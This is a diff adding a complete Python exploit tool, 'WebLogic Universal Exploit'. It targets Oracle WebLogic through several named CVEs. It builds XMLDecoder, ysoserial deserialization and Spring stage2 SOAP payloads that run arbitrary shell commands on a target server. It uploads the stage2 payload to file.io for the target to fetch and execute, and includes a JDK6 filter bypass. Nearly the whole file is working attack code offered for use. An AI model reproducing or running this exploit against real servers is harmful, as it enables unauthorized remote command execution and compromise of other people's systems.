@@ -1,0 +1,237 @@
+import os
+import argparse
+import requests
+import subprocess
+import socket
+import tempfile
+import json
+from enum import Enum
+from urllib3 import disable_warnings
+from urllib3.exceptions import InsecureRequestWarning
+
+# Supress warnings about SSL validations
+disable_warnings(InsecureRequestWarning)
+
+payload_tpl = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">%s</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>"""
+
+byte_tpl = """<void index="%s"><byte>%s</byte></void>"""
+
+stage2_xml_payload_tpl = """<?xml version="1.0" encoding="utf-8"?><beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"><bean id="pb" class="java.lang.ProcessBuilder" init-method="start"><constructor-arg><list><value>%s</value><value>%s</value><value><![CDATA[%s]]></value></list></constructor-arg></bean></beans>"""
+
+class TerminalList(Enum):
+    CMD = ["cmd","/c"]
+    BASH = ["bash", "-c"]
+    POWERSHELL = ["powershell", "-c"]
+    NONE = ["", ""]
+
+    def __str__(self):
+        return str(self.name).lower()
+
+    def __repr__(self):
+        return str(self)
+ 
+    @staticmethod
+    def allEnums():
+        return ', '.join([t.name.lower() for t in list(TerminalList)])
+
+    @staticmethod
+    def argparse(s):
+        try:
+            return TerminalList[s.upper()].value
+        except:
+            msg = ', '.join([t.name.lower() for t in list(TerminalList)])
+            msg = 'Use one of {%s} terminals available.'%(msg)
+            raise argparse.ArgumentTypeError(msg)
+
+class EndpointList(Enum):
+    WLS_WSAT = {"endpoint":"/wls-wsat/CoordinatorPortType11", "description":"CMD output"}
+    _ASYNC = {"endpoint":"/_async/AsyncResponseService", "description":"Blind Exec"}
+
+    def __str__(self):
+        return str(self.name).lower()
+
+    def __repr__(self):
+        return str(self)
+ 
+    @staticmethod
+    def allEnums():
+        return ''.join(["\n\t\t- %s (%s)" % (t.name.lower(), t.value["description"]) for t in list(EndpointList)])
+
+    @staticmethod
+    def argparse(s):
+        try:
+            return EndpointList[s.upper()].value
+        except:
+            msg = ', '.join([t.name.lower() for t in list(EndpointList)])
+            msg = 'Use one of {%s} endpoints available.'%(msg)
+            raise argparse.ArgumentTypeError(msg)
+
+class PayloadList(Enum):
+    PROCESS_BUILDER = {"type":"CMD","default_endpoint": EndpointList.WLS_WSAT.value["endpoint"], "weblogic_version":"all versions", "payload_tpl" : payload_tpl % """<java class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>%s</string></void><void index="1"><string>%s</string></void><void index="2"><string>%s</string></void></array><void method="start" id="process"/></void><object idref="process"><void id="inputStream" method="getInputStream"/></object><object id="scanner" class="java.util.Scanner"><object idref="inputStream"/></object><object idref="scanner"><void method="useDelimiter"><string>\\A</string></void><void id="result" method="next"/></object><void class="java.lang.Thread" method="currentThread"><void method="getCurrentWork" id="current_work"><void method="getClass"><void method="getDeclaredField"><string>connectionHandler</string><void method="setAccessible"><boolean>true</boolean></void><void method="get"><object idref="current_work"></object><void method="getServletRequest"><void method="getResponse"><void method="getServletOutputStream"><void method="writeStream"><object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object></void><void method="flush"/></void><void method="getWriter"><void method="write"><string></string></void></void></void></void></void></void></void></void></void></java>"""}
+    UNIT_OF_WORK_CHANGE_SET = {"type":"SERIAL", "default_endpoint": EndpointList._ASYNC.value["endpoint"], "weblogic_version":"10.x versions", "payload_tpl" : payload_tpl % """<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void><array class="byte" length="%s">%s</array></void></class></java>"""}
+    EVENT_DATA = {"type":"CMD", "default_endpoint": EndpointList.WLS_WSAT.value["endpoint"], "weblogic_version":"12.x versions", "payload_tpl" : payload_tpl % """<java><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index = "0"><string>%s</string></void><void index = "1"><string>%s</string></void><void index = "2"><string>%s</string></void></array><void method="start" id="process"/></void><object idref="process"><void id="inputStream" method="getInputStream"/></object><object id="scanner" class="java.util.Scanner"><object idref="inputStream"/></object><object idref="scanner"><void method="useDelimiter"><string>\\A</string></void><void id="result" method="next"/></object><void class="java.lang.Thread" method="currentThread"><void method="getCurrentWork" id="current_work"><void method="getClass"><void method="getDeclaredField"><string>connectionHandler</string><void method="setAccessible"><boolean>true</boolean></void><void method="get"><object idref="current_work"></object><void method="getServletRequest"><void method="getResponse"><void method="getServletOutputStream"><void method="writeStream"><object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object></void><void method="flush"/></void><void method="getWriter"><void method="write"><string></string></void></void></void></void></void></void></void></void></void></java>]]></string></void></class></java>"""}
+    FS_XML_APP_CTX = {"type":"URL", "default_endpoint": EndpointList._ASYNC.value["endpoint"], "weblogic_version":"all versions", "payload_tpl" : payload_tpl % """<java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>%s</string></void></class></java>"""}
+
+    def __str__(self):
+        return str(self.name).lower()
+
+    def __repr__(self):
+        return str(self)
+ 
+    @staticmethod
+    def allEnums():
+        return ''.join(["\n\t\t- %s (%s - %s)" % (t.name.lower(), t.value["type"], t.value["weblogic_version"]) for t in list(PayloadList)])
+
+    @staticmethod
+    def argparse(s):
+        try:
+            return PayloadList[s.upper()].value
+        except:
+            msg = ', '.join([t.name.lower() for t in list(PayloadList)])
+            msg = 'Use one of {%s} payloads available.'%(msg)
+            raise argparse.ArgumentTypeError(msg)
+
+def create_ysoserial_payload_file(terminal_type, cmd):
+	if not os.path.exists("./ysoserial-modified.jar"):
+		raise "./ysoserial-modified.jar not found! Generate a YSOSerial payload manually and pass in with the argument -y/--ysoserial"
+	if not terminal_type:
+		terminal_type = "none"
+	if not cmd:
+		raise "To build a YSOSERIAL payload you need to specify a command."
+	try:
+		p = subprocess.check_output(['java', '-jar', 'ysoserial-modified.jar', 'Jdk7u21', terminal_type[0], cmd])
+		with open("tmp_payload.bin", "wb") as tmp_file:
+			tmp_file.write(p)
+	except Exception as e:
+		raise "ERROR Generating YSOSERIAL payload: " + str(e) 
+	return "tmp_payload.bin"
+
+def build_serial_payload(xml_payload, cmd, terminal_type=TerminalList.BASH.value, ysoserial_payload_file = ""):
+	if not ysoserial_payload_file:
+		ysoserial_payload_file = create_ysoserial_payload_file(terminal_type, cmd)
+	with open(ysoserial_payload_file, "rb") as f:
+		size = os.fstat(f.fileno()).st_size
+		print("[+] YSOSERIAL payload size: %s " % str(size))
+		byte_id = 0
+		byte = f.read(1)
+		payload = ""
+		while byte:
+			payload += byte_tpl % (str(byte_id), str(byte_to_int(byte)))
+			byte_id += 1
+			byte = f.read(1)
+		payload = xml_payload % (str(size), payload)
+	return payload
+
+def build_cmd_payload(xml_payload, cmd, terminal_type=TerminalList.BASH.value):
+	return xml_payload % (terminal_type[0], terminal_type[1], cmd)
+
+def build_url_payload(xml_payload, cmd, url="", terminal_type=TerminalList.BASH.value):
+	stage2_payload = stage2_xml_payload_tpl % (terminal_type[0], terminal_type[1], cmd)
+	if not url:
+		print("[-] No stage2 URL provided... Storing it now...")
+		fd, path = tempfile.mkstemp()
+		try:
+			with os.fdopen(fd, 'w') as tmp_file:
+				tmp_file.write(stage2_payload)
+			file = {'file': open(path, "rb")}
+			r = requests.post("https://file.io/", params={"expires":"1d"}, files=file)
+			#print(response_to_string(r))
+			response = json.loads(r.text)
+			url = response["link"]
+			print("[+] Stage2 payload stored with success at: %s" % url)
+		finally:
+			os.remove(path)
+	return xml_payload % url
+
+
+def byte_to_int(byte):
+	byte = int.from_bytes(byte, byteorder='big')
+	if byte > 127:
+		return (256-byte) * (-1)
+	else:
+		return byte
+
+def response_to_string(res):
+    return 'HTTP/1.1 {status_code}\n{headers}\n\n{body}'.format(
+        status_code=res.status_code,
+        headers='\n'.join('{}: {}'.format(k, v) for k, v in res.headers.items()),
+        body=res.content.decode("UTF-8"),
+    )
+
+def send_request(target, endpoint, payload, proxy):
+    proxies = {
+        'http': proxy, 
+        'https': proxy
+    }
+    headers = {
+		"Accept-Encoding": "gzip, deflate", 
+		"Accept": "*/*", 
+		"Accept-Language": "en", 
+		"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", 
+		"Connection": "close", 
+		"Content-Type": "text/xml"
+    }
+    response = requests.request(
+                    "POST", 
+                    "%s%s" % (target, endpoint),
+                    data=payload, 
+                    verify=False, 
+                    proxies=proxies, 
+                    headers=headers)
+    return response_to_string(response)
+
+def get_args():
+	parser = argparse.ArgumentParser( prog="weblogic_exploit.py",
+                    formatter_class=lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=100),
+                    epilog= '''This script will generate a valid WebLogic SOAP payload to exploit different CVE's on this web server.
+                    ''')
+	parser.add_argument("target", help="Target Server")
+	parser.add_argument("-pl", "--payload", type=PayloadList.argparse, default=PayloadList.FS_XML_APP_CTX.value, 
+        help=("Use one of the available payloads: (default: %s) %s. " % (PayloadList.FS_XML_APP_CTX, PayloadList.allEnums())))
+	parser.add_argument("-ep", "--endpoint", type=EndpointList.argparse, default=None, 
+        help=("Use one of the configured endpoints: (default: automatic) %s. " % (EndpointList.allEnums())))
+	parser.add_argument("-c", "--cmd", default="whoami", help="Command to execute. (default: whoami)")
+	parser.add_argument("-j", "--jdk6", action="store_true", help="Enable CVE-2019-2729 (bypass for 'class'). DISCLAIMER: Works ONLY in JDK 1.6!")
+	parser.add_argument("-u", "--url", default="", help="Url to fetch stage2. Used with 'URL' payloads. (default: None)")
+	parser.add_argument("-y", "--ysoserial", default="", help="Custom YSOSERIAL payload file. Used with 'SERIAL' payloads. (default: None)")
+	parser.add_argument("-tr", "--terminal", type=TerminalList.argparse, default=TerminalList.BASH.value, 
+        help=("Use one of the available terminals: %s (default: %s)" % (TerminalList.allEnums(), TerminalList.BASH)))
+	parser.add_argument("-px", "--proxy", default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (default: None)")
+	args = parser.parse_args()
+	return args
+
+def main():
+	print ('')
+	print ('========================================================================')
+	print ('|                      WebLogic Universal Exploit                      |')
+	print ('|    CVE-2017-3506 / CVE-2017-10271 / CVE-2019-2725 / CVE-2019-2729    |')
+	print ('|                               by pimps                               |')
+	print ('========================================================================\n')
+
+	args = get_args()
+	target = args.target.strip()
+	proxy = args.proxy.strip()
+	cmd = args.cmd.strip()
+	url = args.url.strip()
+	payload = args.payload
+	endpoint = args.endpoint
+	jdk6 = args.jdk6
+	terminal_type = args.terminal
+	ysoserial_payload_file = args.ysoserial.strip()
+	if payload["type"] == "CMD":
+		xml_payload = build_cmd_payload(payload["payload_tpl"], cmd, terminal_type)
+	elif payload["type"] == "SERIAL":
+		xml_payload = build_serial_payload(payload["payload_tpl"], cmd, terminal_type, ysoserial_payload_file)
+	elif payload["type"] == "URL":
+		xml_payload = build_url_payload(payload["payload_tpl"], cmd, url, terminal_type)
+	if jdk6 is True:
+		xml_payload = xml_payload.replace("<class>","<array method=\"forName\">")
+		xml_payload = xml_payload.replace("</class>","</array>")
+	endpoint_to_use = payload["default_endpoint"] if not endpoint else endpoint["endpoint"]
+	print("[+] Weblogic SOAP payload built with success...")
+	print("[+] Firing exploit now...")
+	response = send_request(target, endpoint_to_use, xml_payload, proxy)
+	print("[+] Bomb delivered... Server responded: \n\n%s" % response)
+
+if __name__ == '__main__':
+	main()
